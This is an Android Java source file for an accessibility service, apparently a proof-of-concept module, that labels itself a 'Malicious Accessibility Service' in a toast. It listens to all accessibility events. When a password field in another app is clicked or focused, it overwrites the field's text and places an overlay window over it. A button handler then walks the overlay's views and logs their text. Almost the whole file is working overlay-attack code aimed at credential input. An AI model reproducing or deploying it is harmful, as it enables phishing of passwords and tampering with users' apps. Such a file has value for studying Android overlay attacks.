package com.testmodule;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityRecord;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.util.Log;
import android.widget.PopupWindow;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import java.util.ArrayList;

public class MyAccessibilityService extends AccessibilityService {
    FrameLayout mLayout;
    boolean overlayIsVisible = false;

    static final String TAG = "RecorderService";

    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
        }
        return "default";
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    @Override
    protected void onServiceConnected() {

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.notificationTimeout = 100;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        this.setServiceInfo(info);
        Toast t = Toast.makeText(getApplicationContext(), "Malicious Accessibility Service is connected now", Toast.LENGTH_SHORT);
        t.show();


    }

    public static void findViews(View v) {
        try {
            if (v instanceof ViewGroup) {
                ViewGroup vg = (ViewGroup) v;
                for (int i = 0; i < vg.getChildCount(); i++) {
                    View child = vg.getChildAt(i);
                    // recursively call this method
                    findViews(child);
                }
            } else if (v instanceof TextView) {
                //do whatever you want ...
                Log.e("INPUT", v.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //Log.v(TAG, String.format(
               // "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
              //  getEventType(event), event.getClassName(), event.getPackageName(),
               // event.getEventTime(), getEventText(event)));

        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                try {
                    Class className = Class.forName(event.getClassName().toString());

                    if (EditText.class.isAssignableFrom(className)) {
                        // An EditText was Clicked or Focused
                        // Use other methods from the accessibilityEvent to do what
                        // you need to do


                        AccessibilityNodeInfo nodeInfo = event.getSource()==null ? null : event.getSource();


                        if (nodeInfo != null && !overlayIsVisible && nodeInfo.isPassword() ) {
                            Rect input = new Rect();
                            nodeInfo.getBoundsInScreen(input);
                            Log.i("TEST", "The TextView Node: " + nodeInfo.getHintText());

                            nodeInfo.refresh();
                            Bundle bundle = new Bundle();
                            bundle.putString(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, "LOOOOL");
                            nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);

                            overlayIsVisible = true;

                            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                            mLayout = new FrameLayout(this);
                            WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
                            lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                            lp.format = PixelFormat.TRANSLUCENT;
                            lp.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                            lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
                            lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
                            lp.x = input.left;
                            lp.y = input.top - 85;
                            lp.gravity = Gravity.TOP | Gravity.LEFT;
                            LayoutInflater inflater = LayoutInflater.from(this);
                            inflater.inflate(R.layout.action_bar, mLayout);
                            wm.addView(mLayout, lp);



                        }

                    }
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }
                break;
        }
    }


    @Override
    public void onInterrupt() {
    }


    public void sendMessage(View view) {
        // Do something in response to button click

        ViewGroup parentView = (ViewGroup) view.getParent();
        parentView.removeView(view);
        overlayIsVisible = false;

        View test = (View) view.getParent();
        
        findViews(test);

        Intent i = new Intent(Intent.ACTION_MAIN);
        PackageManager managerclock = getPackageManager();
        i = managerclock.getLaunchIntentForPackage("com.testmodule");
        i.addCategory(Intent.CATEGORY_LAUNCHER);
        startActivity(i);

    }

}